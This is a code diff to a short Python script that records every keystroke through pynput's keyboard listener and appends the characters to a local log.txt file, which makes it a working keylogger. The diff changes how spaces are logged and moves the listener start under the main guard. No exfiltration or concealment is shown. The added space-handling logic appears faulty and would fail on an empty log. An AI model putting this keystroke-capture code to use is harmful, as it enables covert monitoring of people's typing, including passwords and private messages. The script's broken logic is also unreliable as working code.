@@ -21,21 +21,38 @@ def on_press(key):
 def on_release(key):
     if key == Key.esc:
         return False
+
+def readfile():
+    with open('log.txt', 'r') as f:
+        lastCharacter = f.read()
+            
+        if(lastCharacter[-1] == ' '):
+            return 'True'
+        else:
+            return 'False'
     
 def write_file(key):
     with open('log.txt', 'a') as f:
         for key in keys:
+            
             #removes the quotation marks
             k = str(key).replace("'","")
+            
             #removes the word space
-            if k == str(Key.space):            
-                f.write(' ')
+            if k == str(Key.space): 
+                isTrue = readfile()
+                if isTrue == 'True':
+                    f.write(' ')
+                else:           
+                    continue
             if k.find('Key') == -1:
                 f.write(k)
 
-with Listener(on_press = on_press, on_release = on_release) as listener:
-    listener.join()
 
 if('__main__' == __name__):
+    
     print('it works')
+    
+    with Listener(on_press = on_press, on_release = on_release) as listener:
+        listener.join()
 
